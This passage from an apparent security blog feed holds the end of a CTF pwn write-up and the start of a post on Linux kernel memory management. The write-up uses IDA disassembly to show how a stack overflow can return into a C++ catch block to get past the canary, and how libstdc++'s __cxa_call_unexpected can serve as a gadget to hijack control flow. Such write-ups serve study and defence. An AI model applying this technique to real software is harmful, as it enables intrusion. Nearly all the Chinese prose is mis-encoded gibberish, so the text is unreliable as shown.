class="number">0000000000002557</span>                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">000000000000255</span>A                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">000000000000255F</span>                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000002562</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000002565</span>                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">000000000000256</span>A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000256</span>A</span><br><span class="line">.text:<span class="number">000000000000256</span>A loc_256A:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">3</span>Câ†‘j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                                         ; <span class="built_in">cin</span>+<span class="number">70</span>â†‘j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                 mov     rdx, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000256</span>E                 sub     rdx, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000002577</span>                 jz      <span class="type">short</span> loc_257E</span><br><span class="line">.text:<span class="number">0000000000002579</span>                 call    ___stack_chk_fail</span><br><span class="line">.text:<span class="number">000000000000257</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000257</span>E</span><br><span class="line">.text:<span class="number">000000000000257</span>E loc_257E:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">96</span>â†‘j</span><br><span class="line">.text:<span class="number">000000000000257</span>E                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000002582</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000002583</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000002583</span> ; &#125; <span class="comment">// starts at 24E1</span></span><br><span class="line">.text:<span class="number">0000000000002583</span> <span class="built_in">cin</span>             endp</span><br></pre></td></tr></table></figure><p>æƒ³åŠæ³•è®©ç¨‹åºè¿”å›åˆ°è¿™å°±å¯ä»¥äº†ã€‚æœ¬ç€å®è·µå¤§äºç†è®ºçš„åŸåˆ™æ¯”èµ›çš„æ—¶å€™è¯•äº†å¥½ä¹…ï¼ˆå…¶å®ä¹Ÿå°±ä¸€å°æ—¶å¯èƒ½ï¼‰éƒ½æ²¡æˆï¼Œç»“æœæ˜¯è¦è¿”å›åˆ°0x251aï¼Œæˆ‘å°±ä½äº†5ä¸ªå­—èŠ‚ã€‚</p><p>äº‹å®ä¸Šæ˜¯ï¼Œå°†è¿”å›åœ°å€å¡«æˆæˆ‘ä»¬æƒ³è¦è·³è½¬åˆ°çš„catchå—ï¼Œrbpçš„å€¼åªè¦æ˜¯ä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å°±è¡Œäº†ï¼Œé˜²æ­¢ä¸­é—´æ±‡ç¼–rbpå¯»å€çš„æ—¶å€™sigsegvã€‚</p><h1>å‡ ä¸ªå°é—®é¢˜</h1><h2 id="ç¨‹åºæ€ä¹ˆè¯†åˆ«çš„try-catchå—ï¼Ÿ">ç¨‹åºæ€ä¹ˆè¯†åˆ«çš„try-catchå—ï¼Ÿ</h2><p>ç¼–è¯‘å™¨ä¸ºç¨‹åºç”Ÿæˆäº†ä¸€ä¸ªå¼‚å¸¸å¤„ç†è¡¨<code>.gcc_except_table</code>ï¼Œä½œä¸ºä¸€ä¸ªå•ç‹¬çš„èŠ‚å­˜æ”¾ç›¸å…³çš„ä¿¡æ¯ã€‚</p><h2 id="rbpçš„ä½œç”¨ï¼Ÿ">rbpçš„ä½œç”¨ï¼Ÿ</h2><p>å¦‚æœåœ¨handlerä¸­æœ‰<code>leave;ret</code>çš„gadgetï¼Œæˆ‘ä»¬ç†è®ºä¸Šåœ¨æº¢å‡ºåæ§åˆ¶rbpå°±èƒ½åŠ«æŒæ§åˆ¶æµã€‚å…¶ä»–æƒ…å†µä¸‹ä¸€èˆ¬è¦æ³¨æ„rbpåœ°å€æœ‰æ•ˆã€‚</p><h2 id="æ³¨æ„ï¼š">æ³¨æ„ï¼š</h2><p>è¿™ä¸ªretåœ°å€çš„èŒƒå›´å¹¶ä¸ç²¾ç¡®ï¼Œå°½é‡è¦å†™åˆ°å¸¦æœ‰catchçš„å‡½æ•°çš„tryèŒƒå›´å†…ï¼Œå¦‚æœä¸æˆåŠŸä¸€å®šè¦æ¢é™„è¿‘åœ°å€å¤šè¯•å‡ æ¬¡ï¼Œè¡€æ³ªæ•™è®­ã€‚</p><h1>ä»€ä¹ˆæ˜¯CHOP?</h1><p>CHOPæ˜¯Catch Handler Oriented Programmingã€‚å‡ºè‡ªä¸€ç¯‡è®ºæ–‡ï¼Œæ›´å¤šçš„å¯ä»¥å»çœ‹å¼€ç¯‡æåˆ°çš„blogã€‚æ€»ä¹‹è¿™ç©æ„çš„æ€æƒ³å°±æ˜¯ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cxa_call_unexpected (<span class="type">void</span> *exc_obj_in) &#123;</span><br><span class="line"> xh_terminate_handler = xh-&gt;terminateHandler;</span><br><span class="line"> <span class="keyword">try</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"> <span class="built_in">catch</span> (...) &#123;</span><br><span class="line"> __terminate(xh_terminate_handler);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __terminate (<span class="built_in">void</span> (*handler)()) <span class="keyword">throw</span> () &#123;</span><br><span class="line"> <span class="comment">/* ... */</span></span><br><span class="line"> <span class="built_in">handler</span>();</span><br><span class="line"> std::<span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰å‡½æ•°æŒ‡é’ˆçš„åœ°æ–¹å°±æœ‰pwnï¼Œlibstdc++ä¸­æœ‰è¿™æ ·ä¸€ä¸ªè°ƒç”¨æŒ‡é’ˆçš„åœ°æ–¹ã€‚å¦‚æœå¼‚å¸¸å¤„ç†å‰å­˜åœ¨æ ˆæº¢å‡ºèƒ½åŠ«æŒè¿”å›åœ°å€ï¼Œæˆ‘ä»¬æ§åˆ¶å¥½xh_terminate_handlerè¿™ä¸€å±€éƒ¨å˜é‡åè¿”å›åˆ°<code>__cxa_call_unexpected</code>çš„catchå—å°±èƒ½å®ç°æ§åˆ¶æµåŠ«æŒã€‚é€šè¿‡è¿™ä¸ªGolden Gadgetï¼Œæˆ‘ä»¬å¯ä»¥å°†æœ‰canaryçš„æ ˆæº¢å‡ºå˜æˆæ— canaryçš„æ ˆæº¢å‡ºï¼Œåªéœ€è¦ä»¥è¿™ä¸ªcatchåšè·³æ¿ã€‚</p><p>ç‰ˆæœ¬æ›´é«˜çš„libcä¹Ÿåªæ˜¯è°ƒç”¨è·¯å¾„æ›´å¤æ‚äº†ã€‚</p><p>æ‘¸äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒè‡ª&lt;a href=&quot;https://xz.aliyun.com/t/12967&quot;&gt;æº¢å‡ºæ¼æ´åœ¨å¼‚å¸¸å¤„ç†ä¸­çš„æ”»å‡»åˆ©ç”¨æ‰‹æ³•-ä¸Š&lt;/a&gt;å’Œ&lt;a href=&quot;https://xz.aliyun.com/t/12994&quot;&gt;æº¢å‡ºæ¼æ´åœ¨å¼‚å¸¸å¤„ç†ä¸­çš„æ”»å‡»åˆ©ç”¨æ‰‹æ³•</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="chop" scheme="https://zjw1nd.github.io/tags/chop/"/>
    
  </entry>
  
  <entry>
    <title>é¡µè¡¨ä¹‹ä¸Šâ€”â€”Linuxå†…æ ¸çš„å†…å­˜ç®¡ç†</title>
    <link href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2024-10-30T11:08:20.000Z</published>
    <updated>2024-11-18T06:43:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œè¿›ç¨‹å†…éƒ¨å¯»å€ç”¨çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œè™šæ‹Ÿåœ°å€è¦ç»è¿‡mmuè¢«æ˜ å°„åˆ°ç‰©ç†åœ°å€ï¼Œè¿›ç¨‹çš„é¡µè¡¨æ˜¯ç‹¬ç«‹çš„ç­‰ç­‰ã€‚ä½†æ˜¯é‚£ä¹ˆå¤šé¡µè¡¨ï¼Œå†…æ ¸åˆæ˜¯æ€ä¹ˆè°ƒåº¦é¡µè¡¨çš„å‘¢ï¼Ÿåœ¨æˆ‘ä»¬å‘å†…æ ¸ç”³è¯·ä¸‹ä¸€ä¸ª4kbçš„æ—¶å€™ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p><blockquote><p>å‚è€ƒè‡ªï¼š<a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I</a><br>ä»¥åŠä¸€ç¯‡æ›´åŠ å…¥é—¨çš„ä»‹ç»ï¼š<a href="https://cloud.tencent.com/developer/article/1775509">https://cloud.tencent.com/developer/article/1775509</a><br><a href="https://segmentfault.com/a/1190000043626203">https://segmentfault.com/a/1190000043626203</a></p></blockquote><h1>å†…æ ¸è§†è§’ä¸‹çš„â€œä¸»å­˜â€</h1><p>åœ¨å†…æ ¸çš„è§†å›¾ä¸‹ï¼Œå†…å­˜è‡ªé¡¶å‘ä¸‹æœ‰3çº§çš„ç®¡ç†ï¼Œä¾æ¬¡æ˜¯èŠ‚ç‚¹ï¼ˆnodeï¼‰ï¼ŒåŒºï¼ˆzoneï¼‰å’Œé¡µï¼ˆpageï¼‰æˆ–è€…é¡µæ¡†ï¼ˆpage frameï¼‰ã€‚æˆ‘ä»¬ä»æœ€é«˜ï¼ˆæœ€å¤§ï¼‰çš„ç­‰çº§ä¾æ¬¡å‘ä¸‹çœ‹ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯èŠ‚ç‚¹ï¼Ÿ">ä»€ä¹ˆæ˜¯èŠ‚ç‚¹ï¼Ÿ</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384075">https://blog.csdn.net/gatieme/article/details/52384075</a><br>å†™çš„å¾ˆç»†å¾ˆå¥½ï¼Œä¸å†æ‘˜æŠ„äº†ï¼Œäº†è§£èŠ‚ç‚¹å¯ä»¥ç›´æ¥ç‚¹è¿›å»çœ‹æŒ‰æˆ‘çœ‹è¿™ä¸¤ç¯‡blogçš„ç†è§£ï¼ŒèŠ‚ç‚¹å¤§æ¦‚å°±æ˜¯<strong>ç‰©ç†å†…å­˜æ¡</strong>ï¼Œ è™½ç„¶è‚¯å®šä¸æ˜¯è¿™ä¸ªæ„æ€ï¼Œä½†æ˜¯åœ¨æŠ½è±¡çš„å±‚çº§ä¸Šæ¥è¯´ï¼Œåœ°ä½å¤§æ¦‚æ˜¯ç‰©ç†å†…å­˜æ¡è¿™ä¸€çº§ã€‚è¿™ä¸ªä¸œè¥¿æ¶‰åŠåˆ°ç¡¬ä»¶å¤„ç†å™¨çš„è®¾è®¡ã€‚ä¸€èˆ¬æ¥è®²ï¼Œå¯¹äºç°ä»£å¤šæ ¸CPUè®¿é—®å†…å­˜æœ‰ä¸¤ç§æ¶æ„ï¼ŒUMAï¼ˆå‡åŒ€å­˜å‚¨å™¨å­˜å–ï¼ŒUniform-Memory-Accessï¼‰å’ŒNUMAï¼ˆéå‡åŒ€å­˜å‚¨å™¨å­˜å–ï¼‰ã€‚</p></blockquote><p>å…ˆè¯´UMA,è¿™ç§æ€æƒ³å°±æ˜¯å¯¹äºå¤šä¸ªCPU, ä»–ä»¬å¯¹æ‰€æœ‰ä¸»å­˜éƒ½æœ‰åŒæ ·çš„è®¿é—®çº§åˆ«ï¼Œä»æ€»çº¿å­˜å–çš„æ—¶é—´ç­‰ç­‰éƒ½åŸºæœ¬ä¸€æ ·ï¼Œå¤–å›´è®¾å¤‡ä¹Ÿèƒ½å¤Ÿå…±äº«ã€‚å¤§ç«éƒ½ä¸€æ ·ã€‚</p><p>èŠ‚ç‚¹çš„æ¦‚å¿µåˆ™æ¥è‡ªäºNUMAæ¶æ„ã€‚ç®€å•æ¥è®²ï¼Œè™½ç„¶æ¯ä¸ªCPUéƒ½èƒ½è®¿é—®å…¨éƒ¨çš„ç‰©ç†å†…å­˜ï¼Œä½†æ˜¯å®ƒä»¬è®¿é—®â€œè‡ªå·±çš„â€æœ¬åœ°å­˜å‚¨ä¼šæ›´å¿«ã€‚æˆ‘ä»¬æŠŠè¿™æ ·çš„æœ¬åœ°å­˜å‚¨å«åšâ€œç°‡ï¼ˆbankï¼‰â€ï¼ŒæŠŠè¿™äº›ä¸åŒçš„cpuå«åšâ€œèŠ‚ç‚¹ï¼ˆnodeï¼‰â€ã€‚è€Œåœ¨æ“ä½œç³»ç»Ÿå†…å­˜åˆ†é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¯´çš„èŠ‚ç‚¹ä¹Ÿå°±æŒ‡è¿™äº›å†…å­˜ç°‡äº†ã€‚</p><p>LINUXéœ€è¦çš„æ˜¯ä¸€ç§ä½“ç³»æ— å…³çš„å†…å­˜åˆ†é…ç»“æ„ï¼Œæ‰€ä»¥å®ƒé‡‡ç”¨äº†NUMAçš„èŠ‚ç‚¹æ¦‚å¿µã€‚å¯¹äºUMA,æˆ‘ä»¬å°±è®¤ä¸ºåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°†ä»–è½¬åŒ–æˆä¸€ç§ä¼ªNUMAçš„ä½“ç³»è¿›è¡Œå¤„ç†å°±å¥½äº†ã€‚æ‰€ä»¥ä»¥UMAæ¶æ„ä¸ºä¾‹çš„è¯ï¼ŒèŠ‚ç‚¹å°±æ˜¯å…¨éƒ¨çš„ç‰©ç†å­˜å‚¨å•å…ƒã€‚</p><p>linuxä½¿ç”¨<code>pg_data_t</code>æ¥æè¿°ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pg_data_t structure is used in machines with CONFIG_DISCONTIGMEM</span></span><br><span class="line"><span class="comment"> * (mostly NUMA machines?) to denote a higher-level memory zone than the</span></span><br><span class="line"><span class="comment"> * zone denotes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/*  åŒ…å«äº†ç»“ç‚¹ä¸­å„å†…å­˜åŸŸçš„æ•°æ®ç»“æ„ , å¯èƒ½çš„åŒºåŸŸç±»å‹ç”¨zone_typeè¡¨ç¤º*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">    <span class="comment">/*  æŒ‡ç‚¹äº†å¤‡ç”¨ç»“ç‚¹åŠå…¶å†…å­˜åŸŸçš„åˆ—è¡¨ï¼Œä»¥ä¾¿åœ¨å½“å‰ç»“ç‚¹æ²¡æœ‰å¯ç”¨ç©ºé—´æ—¶ï¼Œåœ¨å¤‡ç”¨ç»“ç‚¹åˆ†é…å†…å­˜   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">    <span class="type">int</span> nr_zones;                                   <span class="comment">/*  ä¿å­˜ç»“ç‚¹ä¸­ä¸åŒå†…å­˜åŸŸçš„æ•°ç›®    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP <span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span>      <span class="comment">/*  æŒ‡å‘pageå®ä¾‹æ•°ç»„çš„æŒ‡é’ˆï¼Œç”¨äºæè¿°ç»“ç‚¹çš„æ‰€æœ‰ç‰©ç†å†…å­˜é¡µï¼Œå®ƒåŒ…å«äº†ç»“ç‚¹ä¸­æ‰€æœ‰å†…å­˜åŸŸçš„é¡µã€‚    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_NO_BOOTMEM</span></span><br><span class="line">       <span class="comment">/*  åœ¨ç³»ç»Ÿå¯åŠ¨bootæœŸé—´ï¼Œå†…å­˜ç®¡ç†å­ç³»ç»Ÿåˆå§‹åŒ–ä¹‹å‰ï¼Œ</span></span><br><span class="line"><span class="comment">       å†…æ ¸é¡µéœ€è¦ä½¿ç”¨å†…å­˜ï¼ˆå¦å¤–ï¼Œè¿˜éœ€è¦ä¿ç•™éƒ¨åˆ†å†…å­˜ç”¨äºåˆå§‹åŒ–å†…å­˜ç®¡ç†å­ç³»ç»Ÿï¼‰</span></span><br><span class="line"><span class="comment">       ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå†…æ ¸ä½¿ç”¨äº†è‡ªä¸¾å†…å­˜åˆ†é…å™¨ </span></span><br><span class="line"><span class="comment">       æ­¤ç»“æ„ç”¨äºè¿™ä¸ªé˜¶æ®µçš„å†…å­˜ç®¡ç†  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span> *<span class="title">bdata</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Must be held any time you expect node_start_pfn, node_present_pages</span></span><br><span class="line"><span class="comment">     * or node_spanned_pages stay constant.  Holding this will also</span></span><br><span class="line"><span class="comment">     * guarantee that any pfn_valid() stays that way.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">     * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">     * å½“ç³»ç»Ÿæ”¯æŒå†…å­˜çƒ­æ’æ‹¨æ—¶ï¼Œç”¨äºä¿æŠ¤æœ¬ç»“æ„ä¸­çš„ä¸èŠ‚ç‚¹å¤§å°ç›¸å…³çš„å­—æ®µã€‚</span></span><br><span class="line"><span class="comment">     * å“ªè°ƒç”¨node_start_pfnï¼Œnode_present_pagesï¼Œnode_spanned_pagesç›¸å…³çš„ä»£ç æ—¶ï¼Œéœ€è¦ä½¿ç”¨è¯¥é”ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* /*èµ·å§‹é¡µé¢å¸§å·ï¼ŒæŒ‡å‡ºè¯¥èŠ‚ç‚¹åœ¨å…¨å±€mem_mapä¸­çš„åç§»</span></span><br><span class="line"><span class="comment">    ç³»ç»Ÿä¸­æ‰€æœ‰çš„é¡µå¸§æ˜¯ä¾æ¬¡ç¼–å·çš„ï¼Œæ¯ä¸ªé¡µå¸§çš„å·ç éƒ½æ˜¯å…¨å±€å”¯ä¸€çš„ï¼ˆä¸åªæ˜¯ç»“ç‚¹å†…å”¯ä¸€ï¼‰  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages ç»“ç‚¹ä¸­é¡µå¸§çš„æ•°ç›® */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page range, including holes                     è¯¥ç»“ç‚¹ä»¥é¡µå¸§ä¸ºå•ä½è®¡ç®—çš„é•¿åº¦ï¼ŒåŒ…å«å†…å­˜ç©ºæ´ */</span></span><br><span class="line">    <span class="type">int</span> node_id;        <span class="comment">/*  å…¨å±€ç»“ç‚¹IDï¼Œç³»ç»Ÿä¸­çš„NUMAç»“ç‚¹éƒ½ä»0å¼€å§‹ç¼–å·  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kswapd_wait;      <span class="comment">/*  äº¤æ¢å®ˆæŠ¤è¿›ç¨‹çš„ç­‰å¾…é˜Ÿåˆ—ï¼Œ</span></span><br><span class="line"><span class="comment">    åœ¨å°†é¡µå¸§æ¢å‡ºç»“ç‚¹æ—¶ä¼šç”¨åˆ°ã€‚åé¢çš„æ–‡ç« ä¼šè¯¦ç»†è®¨è®ºã€‚    */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>     <span class="comment">/* Protected by  mem_hotplug_begin/end() æŒ‡å‘è´Ÿè´£è¯¥ç»“ç‚¹çš„äº¤æ¢å®ˆæŠ¤è¿›ç¨‹çš„task_structã€‚   */</span></span><br><span class="line">    <span class="type">int</span> kswapd_max_order;                       <span class="comment">/*  å®šä¹‰éœ€è¦é‡Šæ”¾çš„åŒºåŸŸçš„é•¿åº¦  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">classzone_idx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="type">int</span> kcompactd_max_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_classzone_idx</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line">    <span class="comment">/* Lock serializing the migrate rate limiting window */</span></span><br><span class="line">    <span class="type">spinlock_t</span> numabalancing_migrate_lock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_next_window;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of pages migrated during the rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_nr_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">     * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="type">spinlock_t</span> split_queue_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">split_queue</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> split_queue_len;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h2 id="ä»€ä¹ˆæ˜¯åŒºï¼Ÿ">ä»€ä¹ˆæ˜¯åŒºï¼Ÿ</h2><blockquote><p>å‚è€ƒè‡ª<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0">https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0</a><br>ä¸Šé¢è¯´é“æˆ‘ä»¬æ¯ä¸ªcpuéƒ½æœ‰ä¸€ä¸ªèŠ‚ç‚¹å†…å­˜ã€‚å¯¹äºæ¯ä¸ªèŠ‚ç‚¹ï¼Œåˆè¢«åˆ’åˆ†ä¸ºä¸åŒçš„åŒºã€‚ä¸€ä¸ªç®¡ç†åŒºåŸŸé€šè¿‡struct zone_structæè¿°, å…¶è¢«å®šä¹‰ä¸ºzone_t, ç”¨ä»¥è¡¨ç¤ºå†…å­˜çš„æŸä¸ªèŒƒå›´, ä½ç«¯èŒƒå›´çš„16MBè¢«æè¿°ä¸ºZONE_DMA, æŸäº›å·¥ä¸šæ ‡å‡†ä½“ç³»ç»“æ„ä¸­çš„(ISA)è®¾å¤‡éœ€è¦ç”¨åˆ°å®ƒ, ç„¶åæ˜¯å¯ç›´æ¥æ˜ å°„åˆ°å†…æ ¸çš„æ™®é€šå†…å­˜åŸŸZONE_NORMAL,æœ€åæ˜¯è¶…å‡ºäº†å†…æ ¸æ®µçš„ç‰©ç†åœ°å€åŸŸZONE_HIGHMEM, è¢«ç§°ä¸ºé«˜ç«¯å†…å­˜ï¼ˆ64ä½å·²ç»ä¸ç”¨äº†ï¼‰.ã€€æ˜¯ç³»ç»Ÿä¸­é¢„ç•™çš„å¯ç”¨å†…å­˜ç©ºé—´, 